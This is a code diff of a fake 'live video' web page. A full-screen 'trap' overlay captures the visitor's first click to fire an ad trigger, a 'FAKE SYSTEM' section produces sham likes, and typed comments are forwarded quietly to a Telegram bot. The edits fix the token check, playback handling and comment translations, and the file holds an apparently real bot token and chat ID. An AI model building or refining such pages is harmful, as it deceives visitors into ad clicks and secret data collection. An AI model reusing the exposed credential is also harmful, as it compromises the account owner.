@@ -62,6 +62,7 @@
 <body>
 
     <div class="video-container">
+        <!-- Make sure you have a video.mp4 file in the same folder -->
         <video id="tgVideo" autoplay loop muted playsinline>
             <source src="video.mp4" type="video/mp4">
         </video>
@@ -105,10 +106,10 @@
 
     <script>
         // ==========================================
-        // CONFIGURATION (এখানে আপনার তথ্য দিন)
+        // CONFIGURATION
         // ==========================================
-        const BOT_TOKEN = "8279372040:AAGKfFsmnkI5ihQE-T2v6hU47dEoZ892_nA"; // যেমন: 708823:AAFg...
-        const CHAT_ID = "-1003119670905";     // যেমন: -100123456789
+        const BOT_TOKEN = "8279372040:AAGKfFsmnkI5ihQE-T2v6hU47dEoZ892_nA"; 
+        const CHAT_ID = "-1003119670905";    
         // ==========================================
 
         function triggerAd() { console.log("SDK Triggered!"); }
@@ -128,7 +129,8 @@
         function handleFirstClick() {
             const video = document.getElementById('tgVideo');
             if(video.muted) {
-                video.muted = false; video.play();
+                video.muted = false; 
+                video.play().catch(e => console.log("Playback failed", e));
                 document.getElementById('tapHint').style.display = 'none';
                 document.getElementById('mainTrap').style.display = 'none';
                 triggerAd();
@@ -156,8 +158,8 @@
             input.value = "";
 
             // 2. Send to Telegram API (Background)
-            // যদি আপনি টোকেন সেট না করেন, এটি কাজ করবে না।
-            if(BOT_TOKEN !== "8279372040:AAGKfFsmnkI5ihQE-T2v6hU47dEoZ892_nA") {
+            // Fix: Check if BOT_TOKEN exists, then send
+            if(BOT_TOKEN && BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("Live Comment: " + message)}`;
                 
                 fetch(url).then(response => {
@@ -166,11 +168,11 @@
                     console.error("Error sending message", err);
                 });
             } else {
-                alert("Please set your Bot Token in the code!");
+                alert("Please check your Bot Token configuration!");
             }
         }
 
-        // --- FAKE SYSTEM (SAME AS BEFORE) ---
+        // --- FAKE SYSTEM ---
         function fakeLike() {
             triggerAd();
             const heartBox = document.getElementById('heartBox');
